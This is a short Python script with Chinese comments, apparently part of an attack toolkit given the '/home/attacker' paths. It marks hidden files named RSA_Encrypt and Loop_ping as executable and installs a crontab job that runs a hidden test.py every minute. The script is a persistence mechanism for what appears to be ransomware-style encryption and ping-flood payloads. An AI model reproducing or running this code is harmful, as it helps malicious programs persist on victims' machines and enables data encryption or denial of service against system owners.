import os
import crontab 
from crontab import CronTab

os.system('chmod +x /home/attacker/Documents/.scarecrow/RSA_Encrypt')
os.system('chmod +x /home/attacker/Desktop/.Backup/RSA_Encrypt')
os.system('chmod +x /home/attacker/Documents/.scarecrow/Loop_ping')
os.system('chmod +x /home/attacker/Desktop/.Backup/Loop_ping')
# os.system('chmod +x /home/attacker/Documents/.scarecrow/bk')
# os.system('chmod +x /home/attacker/Desktop/.Backup/bk')
# 建立當前使用者的crontab，當然也可以建立其他使用者的，但得有足夠許可權
my_user_cron = CronTab(user=True)
# 建立任務
# job = my_user_cron.new(command='/usr/bin/python3 /home/attacker/Documents/.scarecrow/test.py')
job = my_user_cron.new(command='/usr/bin/python3 /home/attacker/Desktop/.Backup/test.py')

# 設定任務執行週期，每兩分鐘執行一次
job.minute.every(1)

# 根據comment查詢，當時返回值是一個生成器物件，不能直接根據返回值判斷任務是否#存在，如果只是判斷任務是否存在，可直接遍歷my_user_cron.crons
# 同時還支援根據command和執行週期查詢，基本類似，不再列舉
# 任務的disable和enable， 預設enable
job.enable()
# 最後將crontab寫入配置檔案
my_user_cron.write() 
